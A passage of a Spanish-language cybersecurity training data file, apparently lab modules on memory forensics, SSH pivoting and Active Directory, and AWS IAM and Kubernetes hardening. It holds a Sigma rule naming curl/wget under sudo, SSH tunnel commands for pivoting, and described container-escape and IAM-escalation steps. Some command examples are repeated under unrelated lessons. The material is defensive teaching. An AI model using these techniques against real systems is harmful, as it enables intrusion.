      secureLabel: 'ROBUSTO (HARDENED) · Regla Sigma Comportamental (TTP: Ejecución de curl/wget con sudo)',
      secureSnippet:
        'title: Suspicious Sudo Execution of Network Download Utility (LOLBin)\nlogsource:\n  product: linux\n  service: sudo\ndetection:\n  selection:\n    COMMAND|contains:\n      - "/usr/bin/curl"\n      - "/usr/bin/wget"\n  condition: selection\nlevel: high',
      secureWhyItWorks:
        'Detecta el comportamiento anómalo (invocar descargadores HTTP con privilegios `sudo` hacia cualquier destino externo), independientemente de la IP o del nombre del archivo.',
    },
    commandCheatSheet: [
      {
        command: 'cat auth.log',
        flagsBreakdown: 'Imprime la secuencia cronológica completa del archivo `auth.log` en el colector SIEM.',
        whenToUse: 'En el Paso 3 del laboratorio para correlacionar la fuerza bruta, el acceso en `deploy` y el `sudo curl`, capturando la bandera.',
      },
      {
        command: 'ufw deny from 203.0.113.42 to any',
        flagsBreakdown: 'Inserta la regla de contención de red contra la IP del servidor C2.',
        whenToUse: 'En el Paso 4 para aislar al atacante tras completar la correlación del incidente.',
      },
    ],
  },

  'mod-10': {
    moduleId: 'mod-10',
    competencyBadge: {
      code: 'CERT-10 · DFIR-MEMORY-FORENSICS',
      name: 'Investigador Forense Digital (DFIR) y Analista de Memoria Volátil',
      skillVerified: 'Aplicación del Orden de Volatilidad (RFC 3227), cadena de custodia SHA-256, recuperación en /proc/<PID>/exe y análisis con strings/Volatility 3.',
    },
    extendedSubModules: [
      {
        id: 'mod-10-ext-1',
        lessonNumber: 'Lección 3',
        title: 'El Orden de Volatilidad (RFC 3227) y Por Qué Jamás se Apaga el Cable de un Servidor Comprometido',
        deepExplanation: [
          'Cuando un administrador sin formación forense descubre que un servidor ha sido hackeado, su primer impulso suele ser apagarlo o reiniciarlo. Hacer eso destruye en milisegundos la fuente de evidencia más valiosa del incidente: la **Memoria RAM volátil**.',
          'El estándar internacional **IETF RFC 3227** establece que la recolección de evidencia debe ir siempre de lo más volátil a lo menos volátil:\n1. **Registros de CPU y caché.**\n2. **Memoria RAM volátil** (adquirida con herramientas como **LiME** en Linux o **WinPmem** en Windows), tabla de procesos en ejecución, sockets de red abiertos (`ss -tulpan`) y sesiones en memoria.\n3. **Sistemas de archivos temporales en RAM** (`/proc`, `/tmp`, `/dev/shm`).\n4. **Discos duros persistentes** (clonados bit a bit mediante bloqueadores de escritura).\n5. **Registros remotos en el SIEM y copias de seguridad (Backups)**.',
        ],
        keyTakeaways: [
          'En lugar de apagar el servidor, **aíslalo en la red (Contención)** y adquiere primero el volcado de memoria RAM.',
          'El malware moderno (*Fileless Malware*) reside exclusivamente en RAM y desaparece si se reinicia el equipo.',
        ],
        codeOrCommandExample:
          '# Calcular el hash SHA-256 de la evidencia para abrir la Cadena de Custodia:\nsha256sum artefacto_sospechoso.bin',
      },
      {
        id: 'mod-10-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Anatomía de `/proc/<PID>/`: Cómo Recuperar un Malware que se Borró a Sí Mismo del Disco',
        deepExplanation: [
          'Una técnica clásica de evasión en Linux consiste en que el atacante descarga su implante ELF en `/tmp/.systemd-sync`, lo ejecuta en segundo plano y un segundo después ejecuta **`rm /tmp/.systemd-sync`**. Si un administrador hace `ls -la /tmp`, la carpeta parece vacía a pesar de que el malware sigue enviando datos al servidor C2.',
          '¿Cómo funciona esto en el kernel Linux? El comando `rm` solo ejecuta la llamada `unlink()`, que borra el nombre del directorio, pero **el inodo y los bloques de datos del ejecutable no se liberan mientras al menos un proceso lo mantenga abierto en memoria**. Si identificas que el proceso malicioso tiene el PID `4120`, dentro de `/proc/4120/` encontrarás el enlace simbólico **`/proc/4120/exe (deleted)`** que apunta directamente al binario vivo en RAM. Basta con ejecutar `cp /proc/4120/exe /var/evidencia/muestra.elf` para recuperar el ejecutable completo bit a bit.',
        ],
        keyTakeaways: [
          '`/proc/<PID>/exe`: permite copiar y recuperar el binario ejecutable aunque haya sido borrado con `rm`.',
          '`/proc/<PID>/maps`: muestra las regiones de memoria y librerías cargadas por ese proceso.',
          '`/proc/<PID>/fd/`: muestra todos los archivos y sockets de red abiertos por el proceso.',
        ],
        codeOrCommandExample:
          '# Extraer cadenas legibles (URLs C2, MUTEX, rutas) del artefacto sin ejecutarlo:\nstrings artefacto_sospechoso.bin',
      },
      {
        id: 'mod-10-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Metodología de Análisis de Memoria RAM con Volatility 3',
        deepExplanation: [
          'Una vez adquirido el volcado de memoria RAM (`memoria_volatil.raw` o `.lime`), el analista forense lo examina en una estación aislada usando **Volatility 3** mediante cuatro plugins fundamentales:',
          '1. **`windows.pstree` / `linux.pstree`:** reconstruye el árbol jerárquico de procesos padre-hijo.\n2. **`windows.psscan`:** recorre las estructuras `EPROCESS` en la memoria física para descubrir procesos ocultos por un *rootkit* (DKOM) que se desvincularon de la lista activa.\n3. **`windows.netscan` / `linux.sockstat`:** extrae todas las conexiones TCP/UDP activas o recién cerradas junto con el PID responsable y la IP remota.\n4. **`windows.malfind` / `linux.malfind`:** busca páginas de memoria anónimas con permisos **`rwx` (Lectura, Escritura y Ejecución simultáneos)** que contengan cabeceras ejecutables (`MZ` en Windows o `\\x7fELF` en Linux), señal inequívoca de inyección de código en memoria.',
        ],
        keyTakeaways: [
          '`pstree` muestra la lista activa; `psscan` descubre procesos ocultos o terminados en memoria física.',
          '`malfind` detecta shellcode y DLLs/ELFs inyectados en regiones de memoria `rwx`.',
        ],
        codeOrCommandExample:
          'sha256sum /tmp/.systemd-sync\nstrings /tmp/.systemd-sync',
      },
      {
        id: 'mod-10-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Cadena de Custodia, Tiempos MACB y Detección de Timestomping',
        deepExplanation: [
          'Para que un análisis forense tenga validez técnica y legal, se debe preservar la **Cadena de Custodia**: jamás se trabaja sobre la evidencia original; se realiza una imagen bit a bit y se documenta que el hash criptográfico **SHA-256** de la copia coincide exactamente con el original.',
          'Al reconstruir la **Super Timeline** del sistema de archivos (ext4 en Linux o `$MFT` en NTFS de Windows), analizamos los cuatro sellos de tiempo **MACB**: **M**odified (modificación del contenido), **A**ccessed (última lectura), **C**hanged (cambio de metadatos/inodo/permisos) y **B**irth (creación del archivo). Muchos atacantes usan `touch -r` para falsificar la fecha `Modified` de su malware (*Timestomping*), pero no pueden falsificar el tiempo `Changed` (`ctime`) del inodo sin alterar el reloj del kernel, lo que delata inmediatamente la manipulación.',
        ],
        keyTakeaways: [
          'La discrepancia entre el tiempo `Modified (mtime)` y el tiempo de cambio de inodo `Changed (ctime)` revela ataques de **Timestomping**.',
          'Documenta siempre el hash `SHA-256` antes y después de extraer indicadores con `strings` o `YARA`.',
        ],
        codeOrCommandExample:
          'sha256sum /tmp/.systemd-sync\nstrings /tmp/.systemd-sync',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Preservación SHA-256',
        title: 'Cálculo del hash criptográfico inmutable antes de tocar la muestra',
        technicalDetail: 'El investigador ejecuta `sha256sum /tmp/.systemd-sync` para registrar la huella de 256 bits en el acta de Cadena de Custodia.',
      },
      {
        phase: 'Fase 2 · Triaje Estático Seguro',
        title: 'Extracción de cadenas ASCII/UTF-8 con strings sin ejecutar el binario',
        technicalDetail: 'Jamás se ejecuta un binario sospechoso en el servidor afectado; se analiza pasivamente con `strings /tmp/.systemd-sync`.',
      },
      {
        phase: 'Fase 3 · Extracción de IOCs',
        title: 'Identificación de la URI de Callback C2 y del identificador MUTEX',
        technicalDetail: 'La salida de `strings` revela `C2_CALLBACK_URI=https://203.0.113.42:4444/beacon`, `MUTEX_ID=AEGIS_DFIR_ARTIFACT_4120` y la bandera forense.',
      },
      {
        phase: 'Fase 4 · Regla YARA + Caza',
        title: 'Creación de firma YARA con el MUTEX para barrer el resto del parque de servidores',
        technicalDetail: 'Con el indicador único (`MUTEX_ID`), se redacta una regla YARA para escanear la memoria y discos de todos los nodos de la organización.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Procedimiento de Intervención ante un Binario Sospechoso en un Servidor en Vivo',
      context: 'Un analista encuentra un proceso anómalo ejecutándose desde `/tmp/.systemd-sync` con PID `4120`.',
      vulnerableLabel: 'INCORRECTO · Apagar el servidor o borrar/ejecutar el binario directamente',
      vulnerableSnippet:
        '# ERRORES GRAVES que destruyen la evidencia o activan el malware:\nrm -f /tmp/.systemd-sync\nreboot\n# O intentar ver qué hace ejecutándolo: /tmp/.systemd-sync --help',
      vulnerableWhyItFails:
        '`rm` y `reboot` destruyen la evidencia en memoria RAM y los sockets abiertos (violando el RFC 3227), y ejecutar el binario puede disparar rutinas destructivas.',
      secureLabel: 'PROCEDIMIENTO FORENSE (HARDENED) · Preservación en /proc, Hash SHA-256 y Análisis Estático',
      secureSnippet:
        '# 1. Recuperar el ejecutable vivo desde el descriptor del kernel en /proc:\ncp /proc/4120/exe /var/log/incident-2026/artefacto_sospechoso.bin\n\n# 2. Registrar Cadena de Custodia SHA-256 y extraer cadenas sin ejecutar:\nsha256sum /tmp/.systemd-sync\nstrings /tmp/.systemd-sync',
      secureWhyItWorks:
        'Preserva una copia íntegra del binario en memoria aunque haya sido borrado en disco, certifica su integridad con SHA-256 y extrae sus IOCs sin ejecutar código malicioso.',
    },
    commandCheatSheet: [
      {
        command: 'sha256sum /tmp/.systemd-sync',
        flagsBreakdown: 'Calcula el hash criptográfico SHA-256 del archivo.',
        whenToUse: 'Paso 1 del laboratorio para documentar la Cadena de Custodia antes de inspeccionar la evidencia.',
      },
      {
        command: 'strings /tmp/.systemd-sync',
        flagsBreakdown: 'Extrae secuencias de caracteres imprimibles (URLs, IPs, mensajes, MUTEX) dentro de un archivo binario.',
        whenToUse: 'Paso 2 del laboratorio para descubrir el C2 y el MUTEX embebido y capturar la bandera forense.',
      },
    ],
  },

  'mod-11': {
    moduleId: 'mod-11',
    competencyBadge: {
      code: 'CERT-11 · REDTEAM-PIVOTING-PTES',
      name: 'Pentester Senior PTES y Especialista en Pivoting / Active Directory',
      skillVerified: 'Ejecución bajo Reglas de Enfrentamiento (RoE), túneles SSH Local/Dynamic Port Forwarding (-L / -D), Kerberoasting y reportes ejecutivos/técnicos.',
    },
    extendedSubModules: [
      {
        id: 'mod-11-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Metodología PTES y Reglas de Enfrentamiento (RoE): Cuándo Detener una Prueba en Vivo',
        deepExplanation: [
          'Un Pentester o operador de Red Team profesional trabaja bajo el estándar **PTES (Penetration Testing Execution Standard)**, cuyas 7 fases son: (1) Interacción Previa (*Scope & RoE*), (2) Recolección de Inteligencia (*OSINT*), (3) Modelado de Amenazas, (4) Análisis de Vulnerabilidades, (5) Explotación, (6) Post-Explotación / Movimiento Lateral, y (7) Informe Ejecutivo y Técnico.',
          'Durante una auditoría existe una regla ética y operativa inquebrantable: **si al acceder a un servidor descubres artefactos de un atacante criminal real activo (como un ransomware o webshell ajena) o si un servicio crítico de producción corre riesgo de caída, debes pausar inmediatamente la prueba en ese activo, preservar la evidencia y activar el canal de comunicación de emergencia con el CISO del cliente**.',
        ],
        keyTakeaways: [
          'Jamás ejecutes pruebas fuera de las direcciones IP y ventanas horarias firmadas en el **Scope**.',
          'Ante indicios de un incidente real previo, detén la intrusión simulada y notifica de inmediato al cliente.',
        ],
        codeOrCommandExample:
          '# Establecer túnel SSH Local Port Forwarding hacia el servicio interno 127.0.0.1:5432:\nssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45',
      },
      {
        id: 'mod-11-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Dominio Absoluto de Pivoting SSH: Local (`-L`), Remote (`-R`) y Dynamic SOCKS5 (`-D`)',
        deepExplanation: [
          'Cuando comprometes un primer servidor en la DMZ (`10.10.10.45`), descubrirás que las bases de datos y paneles internos escuchan exclusivamente en `127.0.0.1` (loopback del propio servidor) o en una red interna aislada (`172.16.50.0/24`) inalcanzable desde tu estación. El **Pivoting SSH** te permite usar ese servidor como puente cifrado mediante tres modalidades:',
          '1. **`ssh -N -L IP_local:Puerto_local:IP_destino:Puerto_destino user@pivote` (Local Port Forwarding):** abre un puerto en tu propia máquina (`15432`) y todo lo que envíes allí viaja por SSH hasta `pivote`, quien lo reenvía a `IP_destino:Puerto_destino` (`127.0.0.1:5432`).\n2. **`ssh -N -R Puerto_remoto:IP_destino:Puerto_destino user@mi_kali` (Remote Port Forwarding):** útil cuando un firewall impide conectar por SSH hacia la víctima, pero la víctima sí puede salir por SSH hacia tu estación.\n3. **`ssh -N -D 127.0.0.1:1080 user@pivote` (Dynamic SOCKS5 Proxy):** convierte tu puerto local `1080` en un proxy SOCKS5 dinámico para enrutar cualquier herramienta con `proxychains4` hacia toda la red interna.',
        ],
        keyTakeaways: [
          '`-L`: trae un puerto remoto/interno específico hacia tu máquina local.',
          '`-D`: abre un proxy SOCKS5 dinámico para explorar múltiples hosts y puertos de una subred interna.',
          '`-N`: indica a SSH que solo establezca el túnel de reenvío sin abrir una shell interactiva.',
        ],
        codeOrCommandExample:
          'ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45',
      },
      {
        id: 'mod-11-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Seguridad en Active Directory: Cómo Funciona Kerberoasting (MITRE T1558.003) y gMSA',
        deepExplanation: [
          'Más del 85% de las grandes empresas gestionan sus identidades corporativas con **Microsoft Active Directory** usando el protocolo **Kerberos**. En Kerberos, cualquier usuario autenticado del dominio (incluso sin privilegios administrativos) puede solicitar al controlador de dominio (KDC) un billete de servicio (**TGS — Ticket Granting Service**) para cualquier cuenta que tenga registrado un **SPN (Service Principal Name, como `MSSQLSvc/db01.corp.local:1433`)**.',
          'El diseño del protocolo Kerberos cifra ese billete TGS utilizando el **hash NTLM/AES de la contraseña de la cuenta de servicio**. Un atacante solicita el TGS legítimamente, lo extrae de su propia memoria e intenta adivinar la contraseña *offline* sin generar bloqueos de cuenta (**Kerberoasting**). La defensa definitiva consiste en usar **Group Managed Service Accounts (gMSA)** (cuentas cuyas contraseñas de 120 caracteres aleatorios las rota Active Directory automáticamente cada 30 días) y forzar cifrado **AES-256** deshabilitando `RC4-HMAC`.',
        ],
        keyTakeaways: [
          'Kerberoasting no explota un bug de software, sino el diseño de Kerberos cuando las cuentas de servicio tienen contraseñas humanas débiles.',
          'Defensa: cuentas **gMSA** (120 caracteres aleatorios) + deshabilitar `RC4` en favor de `AES-256`.',
        ],
        codeOrCommandExample:
          'ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45',
      },
      {
        id: 'mod-11-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Redacción de Informes de Pentesting: Resumen Ejecutivo vs. Reporte Técnico Reproducible',
        deepExplanation: [
          'El producto final por el que una empresa contrata un Pentest o ejercicio de Red Team es el **Informe de Auditoría**. Si encuentras una vulnerabilidad crítica pero no sabes comunicarla, la empresa no podrá corregirla. Todo informe profesional se estructura en dos audiencias:',
          '1. **Resumen Ejecutivo (para el Directorio / CEO / CISO):** redactado sin jerga críptica, traduce los hallazgos técnicos a **impacto de negocio** (riesgo de exfiltración de datos de clientes, interrupción operativa o sanciones regulatorias GDPR/PCI-DSS) y presenta una hoja de ruta de inversión priorizada.\n2. **Informe Técnico de Hallazgos (para Ingeniería y DevSecOps):** por cada vulnerabilidad documenta su identificador CVE/CWE, vector CVSS + contexto, **pasos exactos y reproducibles (PoC con comandos y capturas)**, **causa raíz arquitectónica** y el **fragmento exacto de código o configuración para remediarla**.',
        ],
        keyTakeaways: [
          'Al Directorio le importa el **impacto en el negocio**; a Ingeniería le importa la **reproducibilidad y el parche exacto**.',
          'Documenta siempre qué controles defensivos del Blue Team funcionaron bien durante el ejercicio.',
        ],
        codeOrCommandExample:
          'ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Servicio Oculto',
        title: 'Detección de PostgreSQL (5432/tcp) ligado únicamente a 127.0.0.1 en 10.10.10.45',
        technicalDetail: 'El servicio de base de datos no acepta conexiones directas desde la red externa, solo desde el propio loopback `127.0.0.1` del servidor.',
      },
      {
        phase: 'Fase 2 · Túnel SSH (-L)',
        title: 'Establecimiento de Local Port Forwarding a través del bastión 10.10.10.45',
        technicalDetail: 'El pentester ejecuta `ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45` encapsulando el tráfico TCP dentro de SSH.',
      },
      {
        phase: 'Fase 3 · Acceso Lateral',
        title: 'Alcance exitoso al puerto interno 5432 y captura de la Flag de Pivoting',
        technicalDetail: 'Cualquier conexión local a `127.0.0.1:15432` desemboca directamente en el PostgreSQL interno del servidor objetivo.',
      },
      {
        phase: 'Fase 4 · Hardening SSHD',
        title: 'Restricción de AllowTcpForwarding y PermitTunnel en /etc/ssh/sshd_config',
        technicalDetail: 'El equipo defensivo deshabilita el reenvío de puertos TCP para cuentas no administrativas y exige certificados SSH de corta duración.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Configuración del Demonio OpenSSH (`/etc/ssh/sshd_config`) frente a Abuso de Pivoting',
      context: 'Servidor de aplicación en la DMZ donde los usuarios operativos no necesitan crear túneles TCP hacia la red interna.',
      vulnerableLabel: 'POR DEFECTO (PERMISIVO) · Permite túneles TCP, SOCKS y reenvío de agente',
      vulnerableSnippet:
        '# /etc/ssh/sshd_config por defecto:\nAllowTcpForwarding yes\nPermitTunnel yes\nAllowAgentForwarding yes\nPermitRootLogin yes',
      vulnerableWhyItFails:
        'Si un atacante compromete cualquier cuenta SSH del servidor, puede usar `ssh -L` o `ssh -D` para convertir el servidor en un proxy SOCKS5 hacia toda la red interna.',
      secureLabel: 'SEGURO (HARDENED) · Bloqueo de reenvío TCP y root login en sshd_config',
      secureSnippet:
        '# /etc/ssh/sshd_config endurecido para servidores de aplicación:\nPermitRootLogin no\nPasswordAuthentication no\nAllowTcpForwarding no\nPermitTunnel no\nAllowAgentForwarding no',
      secureWhyItWorks:
        '`AllowTcpForwarding no` y `PermitTunnel no` instruyen al demonio `sshd` para rechazar en el protocolo cualquier solicitud de apertura de canales `direct-tcpip` (`-L` / `-D`).',
    },
    commandCheatSheet: [
      {
        command: 'ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45',
        flagsBreakdown: '`-N` sin comando remoto; `-L local_ip:local_port:dest_ip:dest_port` redirige un puerto específico.',
        whenToUse: 'En el Paso 3 del laboratorio para activar el túnel de pivoting hacia PostgreSQL y capturar la bandera.',
      },
      {
        command: 'ssh -N -D 127.0.0.1:1080 auditor@10.10.10.45',
        flagsBreakdown: '`-D` crea un servidor proxy dinámico SOCKS5 en el puerto local `1080`.',
        whenToUse: 'Cuando necesitas enrutar múltiples herramientas TCP hacia toda una subred interna.',
      },
    ],
  },

  'mod-12': {
    moduleId: 'mod-12',
    competencyBadge: {
      code: 'CERT-12 · CLOUD-K8S-ARCHITECT',
      name: 'Arquitecto de Seguridad Cloud (AWS IAM / IMDSv2) y Kubernetes',
      skillVerified: 'Prevención de escalada IAM (iam:PassRole), blindaje IMDSv2 contra SSRF y hardening de contenedores con Pod Security Standards (Restricted).',
    },
    extendedSubModules: [
      {
        id: 'mod-12-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Anatomía de Escalada de Privilegios en AWS IAM mediante `iam:PassRole`',
        deepExplanation: [
          'En la nube pública (**AWS, Azure, GCP**), el firewall tradicional fue reemplazado por las políticas de **IAM (Identity and Access Management)**. Un error crítico ocurre cuando un administrador quiere que un desarrollador pueda lanzar instancias EC2 o funciones Lambda y le otorga una política con `"Action": ["iam:PassRole", "ec2:RunInstances"]` y **`"Resource": "*"`**.',
          '¿Por qué esto equivale a entregarle el control total de toda la cuenta AWS? Porque `iam:PassRole` permite adjuntar un Rol IAM a un servicio de cómputo. Al tener `"Resource": "*"`, el usuario con pocos permisos puede lanzar una instancia EC2 nueva, adjuntarle el rol **`AdminRole` (con `AdministratorAccess`)**, conectarse a esa instancia y usar las credenciales temporales del rol administrador para convertirse en dueño absoluto de la nube.',
        ],
        keyTakeaways: [
          '`iam:PassRole` jamás debe configurarse con `"Resource": "*"`.',
          'Restringe siempre `Resource` al ARN exacto del rol de mínimo privilegio permitido y aplica **IAM Permission Boundaries**.',
        ],
        codeOrCommandExample:
          '# Auditar el documento JSON de la política IAM en el nodo cloud-cluster:\naws iam get-policy-version',
      },
      {
        id: 'mod-12-ext-2',
        lessonNumber: 'Lección 4',
        title: 'El Servicio de Metadatos `169.254.169.254`: Por qué IMDSv1 falló y Cómo lo blinda IMDSv2',
        deepExplanation: [
          'Las instancias en la nube consultan la dirección IP link-local **`169.254.169.254`** (**Instance Metadata Service — IMDS**) para obtener su configuración y las credenciales temporales (`AccessKeyId`, `SecretAccessKey`, `Token`) de su Rol IAM adjunto. En **IMDSv1**, bastaba con enviar una simple petición **`HTTP GET`** a `http://169.254.169.254/latest/meta-data/iam/security-credentials/<Rol>`, lo que permitió que vulnerabilidades **SSRF** clásicas en aplicaciones web robaran millones de registros (como en el famoso caso Capital One).',
          '**IMDSv2** mitiga este vector mediante dos defensas técnicas: (1) Exige que el cliente inicie sesión enviando primero una petición **`HTTP PUT`** a `/latest/api/token` incluyendo la cabecera personalizada `X-aws-ec2-metadata-token-ttl-seconds` (los ataques SSRF clásicos solo permiten enviar peticiones `GET` sin cabeceras personalizadas); y (2) El paquete de respuesta del token se envía con **`TTL / HopLimit = 1`**, de modo que si la petición vino reenviada desde un contenedor o proxy inverso en otro salto de red, el paquete expira antes de llegar.',
        ],
        keyTakeaways: [
          'IMDSv1 = petición `GET` directa sin estado (vulnerable a SSRF básico).',
          'IMDSv2 = exige petición **`PUT`** inicial con cabecera de TTL + `HttpPutResponseHopLimit = 1` + `HttpTokens = required`.',
        ],
        codeOrCommandExample:
          '# Auditar los Pods en ejecución y sus contextos de seguridad en el clúster:\nkubectl get pods',
      },
      {
        id: 'mod-12-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Anatomía de un Escape de Contenedor en Kubernetes (`privileged: true` y `hostPID: true`)',
        deepExplanation: [
          'A diferencia de una Máquina Virtual completa que tiene su propio kernel invitado sobre un hipervisor, **todos los contenedores (Pods) dentro de un nodo Kubernetes comparten el mismo kernel Linux del servidor físico (Host)**. El aislamiento de un contenedor es simplemente una combinación de **Linux Namespaces** (que limitan qué procesos, red y montajes ve), **cgroups** (que limitan cuánta CPU/RAM consume) y **seccomp / Capabilities**.',
          'Si un desarrollador despliega un Pod con **`securityContext: { privileged: true }`** y **`hostPID: true`**, desactiva todo ese aislamiento: el contenedor recibe todas las Linux Capabilities (`CAP_SYS_ADMIN`), ve todos los procesos del nodo anfitrión y tiene acceso directo a los dispositivos de bloque físicos en `/dev/`. Un atacante que comprometa ese contenedor solo necesita ejecutar `mount /dev/sda1 /mnt` y `chroot /mnt` para tomar control total del nodo Kubernetes y de todos los demás contenedores alojados en él.',
        ],
        keyTakeaways: [
          'Un contenedor NO es una máquina virtual: comparte el kernel del nodo host.',
          '`privileged: true`, `hostPID: true`, `hostNetwork: true` o montar `/var/run/docker.sock` permiten escapar inmediatamente al nodo físico.',
        ],
        codeOrCommandExample:
          'kubectl get pods',
      },
      {
        id: 'mod-12-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Hardening de Kubernetes en Producción: Pod Security Standards (`Restricted`), RBAC y NetworkPolicies',
        deepExplanation: [
          'Para blindar un clúster Kubernetes en producción aplicamos tres controles nativos:\n1. **Pod Security Admission (`enforce: restricted`):** rechaza en el API Server cualquier Pod que no declare `runAsNonRoot: true`, `allowPrivilegeEscalation: false`, `seccompProfile: RuntimeDefault` y `capabilities: { drop: ["ALL"] }`.\n2. **RBAC de Mínimo Privilegio y `automountServiceAccountToken: false`:** por defecto, Kubernetes monta un token JWT de cuenta de servicio en `/var/run/secrets/kubernetes.io/serviceaccount/token` dentro de cada Pod; si tu aplicación no necesita hablar con la API de Kubernetes, desactívalo con `automountServiceAccountToken: false`.\n3. **NetworkPolicies (Política `default-deny-all`):** por defecto todos los Pods de todos los Namespaces pueden hablar entre sí; despliega siempre una `NetworkPolicy` que bloquee el tráfico entre Pods salvo las rutas explícitamente autorizadas.',
        ],
        keyTakeaways: [
          'Aplica la etiqueta `pod-security.kubernetes.io/enforce=restricted` en tus Namespaces de producción.',
          'Desactiva `automountServiceAccountToken: false` en todos los Pods de aplicaciones normales.',
        ],
        codeOrCommandExample:
          'aws iam get-policy-version\nkubectl get pods',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Auditoría AWS IAM',
        title: 'Inspección de la política IAM con aws iam get-policy-version',
        technicalDetail: 'En el nodo `cloud-cluster`, el auditor detecta una política excesiva que concede `iam:PassRole` y `ec2:RunInstances` sobre `Resource: "*"`.',
      },
      {
        phase: 'Fase 2 · Auditoría de Pods K8s',
        title: 'Enumeración de contenedores activos con kubectl get pods',
        technicalDetail: 'Al ejecutar `kubectl get pods`, se descubre que `payment-worker-7d9c8b-x92lq` corre con `privileged=true,hostPID=true`.',
      },
      {
        phase: 'Fase 3 · Detección de Riesgo',
        title: 'Confirmación del vector de Escape de Contenedor a Nodo Host y captura de Flag',
        technicalDetail: 'La combinación de `privileged: true` y `hostPID: true` permite montar el disco del nodo; el auditor captura la bandera de seguridad Cloud.',
      },
      {
        phase: 'Fase 4 · Perfil Restricted + IMDSv2',
        title: 'Aplicación de Pod Security Standards (Restricted), restricción de ARN en PassRole e IMDSv2',
        technicalDetail: 'Se reemplaza el manifiesto por un `securityContext` no privilegiado (`drop: ["ALL"]`), se exige `HttpTokens=required` en EC2 y se acota `iam:PassRole`.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Manifiesto de Despliegue de Pod en Kubernetes (`pod-manifest.yaml`)',
      context: 'Configuración de seguridad del contenedor `payment-worker` desplegado en el clúster de producción.',
      vulnerableLabel: 'VULNERABLE · Pod privilegiado con acceso al espacio de procesos del nodo (Escape a Host)',
      vulnerableSnippet:
        'apiVersion: v1\nkind: Pod\nmetadata:\n  name: payment-worker\nspec:\n  hostPID: true\n  containers:\n  - name: worker\n    image: registry.internal/payment-worker:1.4\n    securityContext:\n      privileged: true',
      vulnerableWhyItFails:
        '`privileged: true` otorga todas las capacidades del kernel (`CAP_SYS_ADMIN`) y acceso a `/dev/sda1`, permitiendo escapar del contenedor al servidor físico.',
      secureLabel: 'SEGURO (HARDENED) · Cumplimiento del perfil Pod Security Standard "Restricted"',
      secureSnippet:
        'apiVersion: v1\nkind: Pod\nmetadata:\n  name: payment-worker\nspec:\n  automountServiceAccountToken: false\n  containers:\n  - name: worker\n    image: registry.internal/payment-worker:1.4\n    securityContext:\n      runAsNonRoot: true\n      runAsUser: 10001\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      seccompProfile:\n        type: RuntimeDefault\n      capabilities:\n        drop: ["ALL"]',
      secureWhyItWorks:
        'Ejecuta el proceso como UID `10001` sin privilegios, bloquea la escalada en el kernel (`no_new_privs`), elimina todas las capacidades Linux y no monta tokens del API Server.',
    },
    commandCheatSheet: [
      {
        command: 'aws iam get-policy-version',
        flagsBreakdown: 'Recupera el documento JSON de la versión activa de la política IAM en el nodo `cloud-cluster`.',
        whenToUse: 'Paso 1 del laboratorio para auditar permisos peligrosos como `iam:PassRole` con `Resource: "*"`.',
      },
      {
        command: 'kubectl get pods',
        flagsBreakdown: 'Lista todos los Pods en el Namespace actual junto con su estado y contexto de seguridad.',
        whenToUse: 'Paso 2 del laboratorio (exclusivo del nodo `cloud-cluster`) para identificar el Pod con `privileged=true` y capturar la bandera.',
      },
    ],
  },
};
